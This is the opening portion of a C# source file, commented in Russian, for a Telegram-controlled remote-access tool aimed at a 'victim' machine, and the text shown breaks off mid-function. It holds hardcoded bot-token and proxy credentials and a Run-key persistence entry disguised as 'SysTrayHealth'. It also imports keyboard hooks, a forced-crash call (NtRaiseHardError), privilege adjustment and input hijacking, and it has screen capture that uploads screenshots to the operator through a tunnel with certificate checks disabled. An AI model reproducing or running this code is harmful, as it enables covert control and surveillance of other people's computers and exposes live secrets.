// pult.cs — личный пульт v7. ПОЛНЫЙ перевод main.py на натив C#/.NET4 (без NuGet и пайтона).
// сеть: телега через самодельный socks5+TLS туннель; getUpdates long-poll; качалка через тот же туннель.
// приколы: WinForms-оверлеи 1:1 с пайтоном (тексты, тайминги, ESC-выходы сохранены).
// вирусы: нативный юнит toxik.exe (csc-сборка в %LOCALAPPDATA%\TelegramBot\vcore), протокол vcore прежний.
// код владельца (0007/sos) на экранах ЖЕРТВЫ не светится — только поле ввода и чат владельца.
// сборка (см. pult.bat):
//   %WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /target:exe /platform:anycpu
//     /optimize+ /codepage:65001 /out:pult.exe /r:System.dll /r:System.Core.dll
//     /r:System.Web.Extensions.dll /r:System.Windows.Forms.dll /r:System.Drawing.dll pult.cs
// запуск: pult.exe (одна копия на машину — bot.lock; --getme = проверить токен и выйти)
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Authentication;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;
using System.Windows.Forms;
using System.Linq;
using Timer = System.Windows.Forms.Timer;
using Microsoft.Win32;

namespace Pult
{
    // ============================================================
    //  константы и общее состояние
    // ============================================================
    internal static class K
    {
        public const string BOT_TOKEN = "8669253902:AAE7nf8J9TqyT597EwsZyosmRHNRuQKoMyI";
        public static readonly long[] ALLOWED_IDS = new long[] { 7352010946, 1885696985 };
        public const string PROXY_URL = "socks5://proxy_user:sP3HL0BCEJtfTdVq@194.87.55.223:42391";

        public static readonly string DATA_DIR =
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\TelegramBot";
        public static readonly string VIRUS_DIR = DATA_DIR + "\\vcore";
        public static readonly string[] VIRUS_JOBS = new string[] { "winlock", "explorer", "wall", "trap", "madness" };

        public const string RUN_PATH = @"Software\Microsoft\Windows\CurrentVersion\Run";
        public const string PERSIST_NAME = "SysTrayHealth";
        public const string POLICY_PATH = @"Software\Microsoft\Windows\CurrentVersion\Policies\System";
        public const string EXPL_PATH = @"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer";
        public const string ADV_PATH = @"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced";
        public const string KB_CODE = "0007";

        // хост = машина, где запущен ЭТОТ пульт. host.cfg (первая строка) переопределяет имя.
        public static readonly Dictionary<string, string> HOST_TITLES = new Dictionary<string, string>();

        public static string HostLabel()
        {
            try
            {
                string cfg = Path.Combine(DATA_DIR, "host.cfg");
                if (File.Exists(cfg))
                {
                    string line = "";
                    using (StreamReader sr = new StreamReader(cfg, Encoding.UTF8))
                    {
                        while ((line = sr.ReadLine()) != null)
                        {
                            line = line.Trim();
                            if (line.Length > 0) return line;
                        }
                    }
                }
            }
            catch { }
            string h = Environment.MachineName;
            return h.Length > 0 ? h : "хост";
        }

        // состояния панели/сессий/ожиданий
        public static readonly Dictionary<long, long> Panel = new Dictionary<long, long>();   // chat -> message_id панели
        public static readonly Dictionary<long, string> Sess = new Dictionary<long, string>(); // chat -> чей пульт открыт
        public static readonly Dictionary<long, string> Pend = new Dictionary<long, string>(); // uid -> ждём текст/файл
        public static readonly object PendLock = new object();
        public static readonly object FloodLock = new object();
        public static readonly ConcurrentDictionary<long, byte> FloodStop = new ConcurrentDictionary<long, byte>();
        public static bool FloodShouldStop(long uid) { byte b; return FloodStop.TryGetValue(uid, out b); }
        public static readonly object BusyLock = new object();
        public static readonly HashSet<string> Busy = new HashSet<string>(); // занятые приколы (по title)

        public static void Log(string msg)
        {
            try { Console.WriteLine(DateTime.Now.ToString("HH:mm:ss ") + msg); } catch { }
        }
    }

    // ============================================================
    //  нативы (user32 / kernel32 / winmm / ntdll)
    // ============================================================
    internal static class N
    {
        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
        [DllImport("user32.dll")] public static extern void keybd_event(byte vk, byte scan, int flags, int extra);
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vk);
        [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
        [DllImport("user32.dll")] public static extern bool GetCursorPos(out POINT pt);
        [DllImport("user32.dll")] public static extern bool ClipCursor(IntPtr rect);
        [DllImport("user32.dll")] public static extern bool ClipCursor(ref RECT rect);
        [DllImport("user32.dll")] public static extern int GetSystemMetrics(int idx);
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern bool SystemParametersInfoW(int act, int ui, string param, int ini);
        [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")] public static extern bool GetWindowRect(IntPtr hwnd, out RECT rc);
        [DllImport("user32.dll")] public static extern bool MoveWindow(IntPtr h, int x, int y, int w, int h2, bool repaint);
        [DllImport("user32.dll")] public static extern bool LockWorkStation();
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern int MessageBoxW(IntPtr h, string t, string cap, int type);
        [DllImport("user32.dll")] public static extern bool SwapMouseButton(bool swap);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool SendMessageTimeoutW(IntPtr h, int msg, int wp, int lp, int flags, int tm, out IntPtr res);

        [DllImport("winmm.dll", CharSet = CharSet.Unicode)]
        public static extern int mciSendStringW(string cmd, StringBuilder buf, int len, IntPtr cb);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern bool EnumDisplaySettingsW(string dev, int mode, ref DEVMODE dm);
        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        public static extern int ChangeDisplaySettingsExW(string dev, ref DEVMODE dm, IntPtr hwnd, int flags, IntPtr lp);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct DEVMODE
        {
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmDeviceName;
            public short dmSpecVersion, dmDriverVersion, dmSize, dmDriverExtra;
            public int dmFields;
            public short dmOrientation, dmScale, dmCopies, dmDefaultSource;
            public int dmPositionX, dmPositionY;
            public int dmDisplayOrientation, dmDisplayFixedOutput;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)] public string dmFormName;
            public short dmLogPixels;
            public int dmBitsPerPel, dmPelsWidth, dmPelsHeight, dmDisplayFlags, dmDisplayFrequency;
            public int dmICMMethod, dmICMIntent, dmMediaType, dmDitherType, dmReserved1, dmReserved2, dmPanningWidth, dmPanningHeight;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct POINT { public int x, y; }
        [StructLayout(LayoutKind.Sequential)]
        public struct RECT { public int L, T, R, B; }

        // WH_KEYBOARD_LL
        [StructLayout(LayoutKind.Sequential)]
        public struct KBDLL { public int vkCode, scanCode, flags, time; public IntPtr extra; }
        public delegate IntPtr HookProc(int code, IntPtr wp, IntPtr lp);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetWindowsHookExW(int id, HookProc proc, IntPtr mod, int tid);
        [DllImport("user32.dll")] public static extern bool UnhookWindowsHookEx(IntPtr hh);
        [DllImport("user32.dll")] public static extern IntPtr CallNextHookEx(IntPtr hook, int code, IntPtr wp, IntPtr lp);
        [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32.dll")] public static extern uint GetCurrentThreadId();
        [DllImport("user32.dll")] public static extern bool PostThreadMessageW(uint tid, int msg, int wp, int lp);

        [StructLayout(LayoutKind.Sequential)]
        public struct MSG { public IntPtr hwnd; public uint message; public IntPtr wp, lp; public uint time; public int px, py; }
        [DllImport("user32.dll")] public static extern int GetMessageW(ref MSG m, IntPtr h, int mn, int mx);
        [DllImport("user32.dll")] public static extern bool TranslateMessage(ref MSG m);
        [DllImport("user32.dll")] public static extern IntPtr DispatchMessageW(ref MSG m);

        [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int access, bool inh, int pid);
        [DllImport("kernel32.dll")] public static extern bool TerminateProcess(IntPtr h, int code);
        [DllImport("kernel32.dll")] public static extern bool CloseHandle(IntPtr h);

        [DllImport("ntdll.dll")] public static extern int RtlAdjustPrivilege(int priv, bool en, int cur, out int old);
        [DllImport("ntdll.dll")] public static extern int NtRaiseHardError(int code, int cargs, int cmod, IntPtr args, int opt, out int resp);

        [DllImport("shell32.dll")] public static extern bool IsUserAnAdmin();

        // SendInput (unicode typing)
        [StructLayout(LayoutKind.Sequential)]
        public struct MOUSEINPUT { public int dx, dy, mouseData, dwFlags, time; public IntPtr extra; }
        [StructLayout(LayoutKind.Sequential)]
        public struct KEYBDINPUT { public short wVk, wScan; public int dwFlags, time; public IntPtr extra; }
        [StructLayout(LayoutKind.Explicit)]
        public struct INPUTUNION { [FieldOffset(0)] public MOUSEINPUT mi; [FieldOffset(0)] public KEYBDINPUT ki; }
        [StructLayout(LayoutKind.Explicit)]
        public struct INPUT { [FieldOffset(0)] public int type; [FieldOffset(8)] public INPUTUNION u; }
        [DllImport("user32.dll", SetLastError = true)]
        private static extern int SendInput(int n, INPUT[] list, int size);

        public static void TypeText(string text)
        {
            foreach (char ch in text)
            {
                INPUT inp = new INPUT();
                inp.type = 1;
                if (ch == '\n')
                {
                    inp.u.ki.wVk = 0x0D; inp.u.ki.dwFlags = 0;
                    Send(inp); inp.u.ki.dwFlags = 2; Send(inp);
                }
                else
                {
                    inp.u.ki.wScan = (short)ch; inp.u.ki.dwFlags = 4;
                    Send(inp); inp.u.ki.dwFlags = 6; Send(inp);
                }
                Thread.Sleep(4);
            }
        }
        private static void Send(INPUT inp) { try { SendInput(1, new INPUT[] { inp }, Marshal.SizeOf(typeof(INPUT))); } catch { } }
    }
    // ============================================================
    //  транспорт: socks5-туннель → TLS → HTTP/1.1 на api.telegram.org
    //  (python-версия ехала через httpx+socks — тут то же самое, но голыми сокетами)
    // ============================================================
    internal static class Tg
    {
        internal static readonly string ApiHost = "api.telegram.org";
        private static string PHost = "194.87.55.223";
        private static int PPort = 42391;
        private static string PUser = "";
        private static string PPass = "";

        private static NetworkStream _sock;
        private static SslStream _tls;
        private readonly static object Gate = new object();

        static Tg()
        {
            string u = K.PROXY_URL;
            if (!string.IsNullOrEmpty(u) && u.StartsWith("socks5"))
            {
                // socks5://user:pass@host:port
                int p = u.IndexOf("://");
                string rest = u.Substring(p + 3);
                int at = rest.IndexOf('@');
                if (at >= 0) { string ui = rest.Substring(0, at); rest = rest.Substring(at + 1); int c = ui.IndexOf(':'); if (c >= 0) { PUser = ui.Substring(0, c); PPass = ui.Substring(c + 1); } }
                else { PUser = ""; PPass = ""; }
                int colon = rest.LastIndexOf(':');
                if (colon >= 0) { PHost = rest.Substring(0, colon); PPort = int.Parse(rest.Substring(colon + 1).TrimEnd('/')); }
            }
        }

        private static SslStream Tunnel(string host, int port)
        {
            Socket tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            tcp.NoDelay = true;
            tcp.ReceiveTimeout = 125000;
            tcp.SendTimeout = 125000;
            tcp.Connect(PHost, PPort);
            NetworkStream ns = new NetworkStream(tcp, true);
            SocksHandshake(ns, host, port);
            SslStream ssl = new SslStream(ns, false, delegate(object s, System.Security.Cryptography.X509Certificates.X509Certificate ce, System.Security.Cryptography.X509Certificates.X509Chain ch, System.Net.Security.SslPolicyErrors err) { return true; });
            ssl.AuthenticateAsClient(host, null, SslProtocols.Tls12, false);
            return ssl;
        }

        private static void SocksHandshake(NetworkStream ns, string host, int port)
        {
            bool needAuth = PUser.Length > 0;
            ns.Write(new byte[] { 5, 1, (byte)(needAuth ? 2 : 0) }, 0, 3);
            int v = ns.ReadByte(), m = ns.ReadByte();
            if (v != 5) throw new IOException("прокси не socks5");
            if (m == 2)
            {
                byte[] ub = Encoding.ASCII.GetBytes(PUser), pb = Encoding.ASCII.GetBytes(PPass);
                byte[] a = new byte[3 + ub.Length + pb.Length];
                a[0] = 1; a[1] = (byte)ub.Length; ub.CopyTo(a, 2);
                a[2 + ub.Length] = (byte)pb.Length; pb.CopyTo(a, 3 + ub.Length);
                ns.Write(a, 0, a.Length);
                if (ns.ReadByte() != 1 || ns.ReadByte() != 0) throw new IOException("прокси отверг логин/пароль");
            }
            else if (m != 0) throw new IOException("прокси-метод не торчит: " + m);

            byte[] hb = Encoding.ASCII.GetBytes(host);
            byte[] req = new byte[7 + hb.Length];
            req[0] = 5; req[1] = 1; req[2] = 0; req[3] = 3; req[4] = (byte)hb.Length;
            hb.CopyTo(req, 5);
            req[5 + hb.Length] = (byte)(port / 256); req[6 + hb.Length] = (byte)(port % 256);
            ns.Write(req, 0, req.Length);

            int v2 = ns.ReadByte(), rep = ns.ReadByte();
            if (v2 != 5) throw new IOException("socks5: кривой ответ");
            if (rep != 0) throw new IOException("socks5: conn " + host + ":" + port + " отклонён (rep=" + rep + ")");
            ns.ReadByte(); // rsv
            int atyp = ns.ReadByte();
            if (atyp == 1) { ns.ReadByte(); ns.ReadByte(); ns.ReadByte(); ns.ReadByte(); }
            else if (atyp == 4) { byte[] a6 = new byte[16]; ReadFull(ns, a6, 16); }
            else if (atyp == 3) { int ln = ns.ReadByte(); byte[] skip = new byte[ln]; ReadFull(ns, skip, ln); }
            ns.ReadByte(); ns.ReadByte(); // порт
        }

        private static void ReadFull(NetworkStream ns, byte[] buf, int len)
        {
            int off = 0;
            while (off < len) { int r = ns.Read(buf, off, len - off); if (r <= 0) throw new IOException("socks5: обрыв"); off += r; }
        }

        private static string ReadLine(Stream s)
        {
            StringBuilder sb = new StringBuilder();
            while (true)
            {
                int b = s.ReadByte();
                if (b < 0) throw new IOException("поток закрыт посреди заголовков");
                if (b == 10) break;
                if (b != 13) sb.Append((char)b);
            }
            return sb.ToString();
        }

        private static byte[] ReadChunked(Stream s)
        {
            MemoryStream ms = new MemoryStream();
            while (true)
            {
                string ln = ReadLine(s);
                int size = Convert.ToInt32(ln.Trim().Split(';')[0], 16);
                if (size == 0) { ReadLine(s); break; }
                byte[] buf = new byte[size]; ReadFull2(s, buf, size); ms.Write(buf, 0, size);
                ReadLine(s);
            }
            return ms.ToArray();
        }

        private static void ReadFull2(Stream s, byte[] buf, int len)
        {
            int off = 0;
            while (off < len) { int r = s.Read(buf, off, len - off); if (r <= 0) throw new IOException("обрыв при чтении тела"); off += r; }
        }

        private static void Drop()
        {
            try { if (_tls != null) _tls.Dispose(); } catch { }
            try { if (_sock != null) _sock.Dispose(); } catch { }
            _tls = null; _sock = null;
        }

        /// <summary>HTTP-запрос по туннелю. Возвращает ТЕЛО при любом статусе (ok в json проверит Api).</summary>
        public static byte[] Req(string method, string absPath, string ctype, byte[] body)
        {
            lock (Gate)
            {
                for (int attempt = 0; attempt < 3; attempt++)
                {
                    try
                    {
                        if (_tls == null) { Drop(); _tls = Tunnel(ApiHost, 443); _sock = null; }
                        StringBuilder head = new StringBuilder();
                        head.Append(method).Append(' ').Append(absPath).Append(" HTTP/1.1\r\n");
                        head.Append("Host: ").Append(ApiHost).Append("\r\n");
                        head.Append("User-Agent: Mozilla/5.0\r\n");
                        if (body != null && body.Length > 0) head.Append("Content-Type: ").Append(ctype).Append("\r\n");
                        head.Append("Content-Length: ").Append(body == null ? 0 : body.Length).Append("\r\n");
                        head.Append("Connection: keep-alive\r\n\r\n");
                        byte[] hb = Encoding.ASCII.GetBytes(head.ToString());
                        _tls.Write(hb, 0, hb.Length);
                        if (body != null && body.Length > 0)
                        {
                            _tls.Write(body, 0, body.Length);
                        }
                        _tls.Flush();

                        int clen = -1; bool chunked = false; bool closed = false; int status = 0;
                        string ln;
                        while ((ln = ReadLine(_tls)).Length > 0)
                        {
                            if (ln.StartsWith("HTTP/") && status == 0)
                            {
                                int sp = ln.IndexOf(' '); int sp2 = ln.IndexOf(' ', sp + 1);
                                int.TryParse(ln.Substring(sp + 1, sp2 - sp - 1), out status);
                            }
                            else if (ln.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase))
                                int.TryParse(ln.Substring(15).Trim(), out clen);
                            else if (ln.StartsWith("Transfer-Encoding:", StringComparison.OrdinalIgnoreCase) && ln.ToLower().Contains("chunked"))
                                chunked = true;
                            else if (ln.StartsWith("Connection:", StringComparison.OrdinalIgnoreCase) && ln.ToLower().Contains("close"))
                                closed = true;
                        }
                        if (status == 100)
                        {
                            while ((ln = ReadLine(_tls)).Length > 0)
                            {
                                if (ln.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase)) int.TryParse(ln.Substring(15).Trim(), out clen);
                                else if (ln.StartsWith("Transfer-Encoding:", StringComparison.OrdinalIgnoreCase) && ln.ToLower().Contains("chunked")) chunked = true;
                                else if (ln.StartsWith("Connection:", StringComparison.OrdinalIgnoreCase) && ln.ToLower().Contains("close")) closed = true;
                            }
                        }
                        byte[] result;
                        if (chunked) result = ReadChunked(_tls);
                        else if (clen >= 0) { result = new byte[clen]; ReadFull2(_tls, result, clen); }
                        else { MemoryStream ms = new MemoryStream(); byte[] buf = new byte[65536]; int r; while ((r = _tls.Read(buf, 0, buf.Length)) > 0) ms.Write(buf, 0, r); result = ms.ToArray(); }
                        if (closed || chunked || clen < 0) Drop();
                        return result;
                    }
                    catch
                    {
                        Drop();
                        if (attempt == 2) throw;
                        Thread.Sleep(500);
                    }
                }
                throw new IOException("туннель умер окончательно");
            }
        }

        /// <summary>качалка из внешних URL и из /file/: туннель на host:port, 1 запрос, потом закрыть. useTls=false — голый http</summary>
        public static Dictionary<string, object> Fetch(string hostTo, int portTo, string absPath, bool useTls, out int status)
        {
            int st = 0;
            Stream s;
            try
            {
                if (useTls)
                {
                    s = Tunnel(hostTo, portTo);
                }
                else
                {
                    Socket tcp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    tcp.NoDelay = true;
                    tcp.ReceiveTimeout = 125000;
                    tcp.SendTimeout = 125000;
                    tcp.Connect(PHost, PPort);
                    NetworkStream ns = new NetworkStream(tcp, true);
                    SocksHandshake(ns, hostTo, portTo);
                    s = ns;
                }
            }
            catch { status = -1; throw; }
            try
            {
                string head = "GET " + absPath + " HTTP/1.1\r\nHost: " + hostTo + "\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\nAccept: */*\r\n\r\n";
                byte[] hb = Encoding.ASCII.GetBytes(head);
                s.Write(hb, 0, hb.Length);
                int clen = -1; bool chunked = false; string loc = null;
                string ln;
                while ((ln = ReadLine(s)).Length > 0)
                {
                    if (ln.StartsWith("HTTP/") && st == 0) { int sp = ln.IndexOf(' '); int sp2 = ln.IndexOf(' ', sp + 1); int.TryParse(ln.Substring(sp + 1, sp2 - sp - 1), out st); }
                    else if (ln.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase)) int.TryParse(ln.Substring(15).Trim(), out clen);
                    else if (ln.StartsWith("Transfer-Encoding:", StringComparison.OrdinalIgnoreCase) && ln.ToLower().Contains("chunked")) chunked = true;
                    else if (ln.StartsWith("Location:", StringComparison.OrdinalIgnoreCase)) loc = ln.Substring(9).Trim();
                }
                byte[] result;
                if (chunked) result = ReadChunked(s);
                else if (clen >= 0) { result = new byte[clen]; ReadFull2(s, result, clen); }
                else { MemoryStream ms = new MemoryStream(); byte[] buf = new byte[65536]; int r; while ((r = s.Read(buf, 0, buf.Length)) > 0) ms.Write(buf, 0, r); result = ms.ToArray(); }
                if (st >= 300 && st < 400 && loc != null)
                {
                    status = st;
                    Dictionary<string, object> redir = new Dictionary<string, object>();
                    redir["__redirect"] = loc;
                    return redir;
                }
                status = st;
                Dictionary<string, object> okres = new Dictionary<string, object>();
                okres["__body"] = result;
                return okres;
            }
            finally { try { s.Dispose(); } catch { } }
        }
    }

    // ============================================================
    //  API-обёртки телеги
    // ============================================================
    internal static class Api
    {
        public static readonly JavaScriptSerializer J = new JavaScriptSerializer();
        static Api() { J.MaxJsonLength = int.MaxValue; }

        public static object D(object o, string key)
        {
            Dictionary<string, object> d = o as Dictionary<string, object>;
            if (d == null) return null;
            object v; return d.TryGetValue(key, out v) ? v : null;
        }
        public static long L(object o)
        {
            if (o is long) return (long)o;
            if (o is decimal) return Convert.ToInt64(o);
            try { return Convert.ToInt64(o); } catch { return 0; }
        }
        public static string S(object o) { return o == null ? "" : o.ToString(); }

        public static string JsonStr(string s) { return J.Serialize(s); }

        public static string[] Row(params string[] pairs) { return pairs; }

        public static string Kb(params string[][] rows)
        {
            StringBuilder sb = new StringBuilder("[");
            for (int r = 0; r < rows.Length; r++)
            {
                if (r > 0) sb.Append(',');
                sb.Append('[');
                string[] row = rows[r];
                for (int i = 0; i < row.Length; i += 2)
                {
                    if (i > 0) sb.Append(',');
                    sb.Append("{\"text\":").Append(JsonStr(row[i]));
                    sb.Append(",\"callback_data\":").Append(JsonStr(row[i + 1])).Append('}');
                }
                sb.Append(']');
            }
            sb.Append(']');
            return sb.ToString();
        }

        private static object CallJson(string method, string bodyJson, bool quiet)
        {
            string path = "/bot" + K.BOT_TOKEN + "/" + method;
            byte[] body = Encoding.UTF8.GetBytes(bodyJson);
            try
            {
                byte[] resp = Tg.Req("POST", path, "application/json", body);
                if (resp == null || resp.Length == 0) { if (quiet) return null; throw new IOException(method + ": пустой ответ"); }
                object parsed = J.DeserializeObject(Encoding.UTF8.GetString(resp));
                object ok = D(parsed, "ok");
                if (ok is bool && (bool)ok) return D(parsed, "result");
                if (quiet) return null;
                throw new IOException(method + ": " + S(D(parsed, "description")));
            }
            catch (Exception e)
            {
                if (quiet) return null;
                throw new IOException(method + ": " + e.Message, e);
            }
        }

        public static object Call(string method, string bodyJson) { return CallJson(method, bodyJson, false); }
        public static object CallQ(string method, string bodyJson) { return CallJson(method, bodyJson, true); }

        public static long SendMsg(long chat, string text, string kb, bool html, long replyTo)
        {
            StringBuilder sb = new StringBuilder();
            sb.Append("{\"chat_id\":").Append(chat);
            sb.Append(",\"text\":").Append(JsonStr(text));
            if (html) sb.Append(",\"parse_mode\":\"HTML\"");
            if (replyTo > 0) sb.Append(",\"reply_to_message_id\":").Append(replyTo);
            if (!string.IsNullOrEmpty(kb)) sb.Append(",\"reply_markup\":{\"inline_keyboard\":").Append(kb).Append('}');
            sb.Append('}');
            object res = CallQ("sendMessage", sb.ToString());
            return res == null ? 0 : L(D(res, "message_id"));
        }
        public static void Send(long chat, string text) { SendMsg(chat, text, null, false, 0); }

        public static bool Edit(long chat, long mid, string text, string kb, bool html)
        {
            if (mid <= 0 || chat == 0) return false;
            StringBuilder sb = new StringBuilder();
            sb.Append("{\"chat_id\":").Append(chat);
            sb.Append(",\"message_id\":").Append(mid);
            sb.Append(",\"text\":").Append(JsonStr(text));
            if (html) sb.Append(",\"parse_mode\":\"HTML\"");
            if (!string.IsNullOrEmpty(kb)) sb.Append(",\"reply_markup\":{\"inline_keyboard\":").Append(kb).Append('}');
            sb.Append('}');
            return CallQ("editMessageText", sb.ToString()) != null;
        }

        public static void AnswerCb(string cbId) { try { CallQ("answerCallbackQuery", "{\"callback_query_id\":" + JsonStr(cbId) + "}"); } catch { } }
        public static void AnswerCbAlert(string cbId, string text)
        {
            try
            {
                CallQ("answerCallbackQuery", "{\"callback_query_id\":" + JsonStr(cbId) + ",\"text\":" + JsonStr(text) + ",\"show_alert\":true}");
            }
            catch { }
        }

        public static string Field(long chat, string name, string val, MemoryStream ms, string bound)
        {
            byte[] p = Encoding.UTF8.GetBytes("\r\n--" + bound + "\r\nContent-Disposition: form-data; name=\"" + name + "\"\r\n\r\n" + val);
            ms.Write(p, 0, p.Length);
            return null;
        }

        public static void SendPhoto(long chat, byte[] data, string fname, string ctype, string caption)
        {
            try
            {
                string bound = "----pult" + Guid.NewGuid().ToString("N").Substring(0, 14);
                using (MemoryStream ms = new MemoryStream())
                {
                    Field(chat, "chat_id", chat.ToString(), ms, bound);
                    if (!string.IsNullOrEmpty(caption)) Field(chat, "caption", caption, ms, bound);
                    byte[] fp = Encoding.UTF8.GetBytes("\r\n--" + bound + "\r\nContent-Disposition: form-data; name=\"photo\"; filename=\"" +
                        fname + "\"\r\nContent-Type: " + ctype + "\r\n\r\n");
                    ms.Write(fp, 0, fp.Length);
                    ms.Write(data, 0, data.Length);
                    byte[] tail = Encoding.ASCII.GetBytes("\r\n--" + bound + "--\r\n");
                    ms.Write(tail, 0, tail.Length);
                    Tg.Req("POST", "/bot" + K.BOT_TOKEN + "/sendPhoto", "multipart/form-data; boundary=" + bound, ms.ToArray());
                }
            }
            catch (Exception e) { K.Log("sendPhoto fail: " + e.Message); }
        }

        public static object GetFileMeta(string fileId)
        {
            return Call("getFile", "{\"file_id\":" + JsonStr(fileId) + "}");
        }

        public static byte[] GrabFile(string filePath)
        {
            int st;
            // файловый GET может вернуть 200 без Content-Length при keep-alive — мы ставим close, значит read-to-close сработает
            Dictionary<string, object> r = Tg.Fetch(Tg.ApiHost, 443, "/file/bot" + K.BOT_TOKEN + "/" + filePath, true, out st);
            if (r.ContainsKey("__redirect"))
            {
                string loc = (string)r["__redirect"];
                int p2 = loc.IndexOf('/', loc.IndexOf("://") + 3);
                string nextFull = loc.Substring(p2);
                r = Tg.Fetch(Tg.ApiHost, 443, nextFull, true, out st);
            }
            if (r.ContainsKey("__body")) return (byte[])r["__body"];
            return new byte[0];
        }
    }
    // ============================================================
    //  UI-помощники: STA-потоки, полноэкранные формы, подписи
    // ============================================================
    internal static class Fx
    {
        public static void RunSta(ThreadStart job)
        {
            Thread th = new Thread(job);
            th.SetApartmentState(ApartmentState.STA);
            th.IsBackground = true;
            th.Start();
        }

        public static void Over(Action<Form> build)
        {
            RunSta(delegate
            {
                try { Form f = new Form(); f.KeyPreview = true; build(f); Application.Run(f); } catch { }
            });
        }

        public static Color C(string hex) { try { return ColorTranslator.FromHtml(hex); } catch { return Color.Black; } }

        public static Form Full(string bg)
        {
            Form f = new Form();
            f.FormBorderStyle = FormBorderStyle.None;
            f.StartPosition = FormStartPosition.Manual;
            f.Bounds = SystemInformation.VirtualScreen;
            f.TopMost = true;
            f.ShowInTaskbar = false;
            f.BackColor = C(bg);
            f.KeyPreview = true;
            return f;
        }

        public static Label Lab(string text, float size, string fg, string bg, bool bold, string fam)
        {
            Label l = new Label();
            l.Text = text;
            l.AutoSize = true;
            l.ForeColor = C(fg);
            l.BackColor = C(bg);
            FontStyle st = bold ? FontStyle.Bold : FontStyle.Regular;
            l.Font = new Font(string.IsNullOrEmpty(fam) ? "Segoe UI" : fam, size, st);
            return l;
        }

        /// <summary>питоновский .place(relx=…, rely=…, anchor=…): nw/w/n/ne/se/mm</summary>
        public static void Place(Form f, Control c, double rx, double ry, string anc)
        {
            f.Controls.Add(c);
            EventHandler put = delegate(object s, EventArgs e)
            {
                int W = f.ClientSize.Width, H = f.ClientSize.Height;
                int x, y;
                if (anc == "nw") { x = (int)(rx * W); y = (int)(ry * H); }
                else if (anc == "w") { x = (int)(rx * W); y = (int)(ry * H - c.Height / 2); }
                else if (anc == "n") { x = (int)(rx * W - c.Width / 2); y = (int)(ry * H); }
                else if (anc == "ne") { x = (int)(rx * W - c.Width); y = (int)(ry * H); }
                else if (anc == "se") { x = (int)(rx * W - c.Width); y = (int)(ry * H - c.Height); }
                else { x = (int)(rx * W - c.Width / 2); y = (int)(ry * H - c.Height / 2); }
                c.Location = new Point(x, y);
            };
            f.Load += put;
            f.Shown += put;
            f.Resize += put;
        }

        public static void EscClose(Form f)
        {
            f.KeyDown += delegate(object s, KeyEventArgs e) { if (e.KeyCode == Keys.Escape) { e.Handled = true; try { f.Close(); } catch { } } };
            f.MouseDown += delegate(object s, MouseEventArgs e) { try { f.Close(); } catch { } };
        }

        public static void EscOnly(Form f)
        {
            f.KeyDown += delegate(object s, KeyEventArgs e) { if (e.KeyCode == Keys.Escape) { e.Handled = true; try { f.Close(); } catch { } } };
        }

        public static void AutoClose(Form f, int ms)
        {
            Timer t = new Timer();
            t.Interval = ms;
            t.Tick += delegate { t.Stop(); try { f.Close(); } catch { } };
            t.Start();
        }

        public static Bitmap GrabAll()
        {
            Rectangle vs = SystemInformation.VirtualScreen;
            Bitmap bmp = new Bitmap(vs.Width, vs.Height);
            using (Graphics g = Graphics.FromImage(bmp)) g.CopyFromScreen(vs.X, vs.Y, 0, 0, bmp.Size);
            return bmp;
        }

        public static byte[] PngBytes(Bitmap bmp)
        {
            using (MemoryStream ms = new MemoryStream()) { bmp.Save(ms, ImageFormat.Png); return ms.ToArray(); }
        }

        public static byte[] JpgBytes(Bitmap bmp)
        {
            try
            {
                ImageCodecInfo jpg = null;
                foreach (ImageCodecInfo icec in ImageCodecInfo.GetImageEncoders())
                    if (icec.MimeType == "image/jpeg") jpg = icec;
                if (jpg == null) { using (MemoryStream ms = new MemoryStream()) { bmp.Save(ms, ImageFormat.Jpeg); return ms.ToArray(); } }
                EncoderParameters ep = new EncoderParameters(1);
                ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 85L);
                using (MemoryStream ms = new MemoryStream()) { bmp.Save(ms, jpg, ep); return ms.ToArray(); }
            }
            catch
            {
                using (MemoryStream ms = new MemoryStream()) { try { bmp.Save(ms, ImageFormat.Jpeg); return ms.ToArray(); } catch { return new byte[0]; } }
            }
        }

        public static void Invert(Bitmap bmp)
        {
            Bitmap src = (Bitmap)bmp.Clone();
            try
            {
                using (Graphics g = Graphics.FromImage(bmp))
                using (ImageAttributes ia = new ImageAttributes())
                {
                    float[][] m = new float[][] {
                        new float[] { -1, 0, 0, 0, 1 },
                        new float[] { 0, -1, 0, 0, 1 },
                        new float[] { 0, 0, -1, 0, 1 },
                        new float[] { 0, 0, 0, 1, 0 },
                        new float[] { 0, 0, 0, 0, 1 }
                    };
                    ia.SetColorMatrix(new ColorMatrix(m));
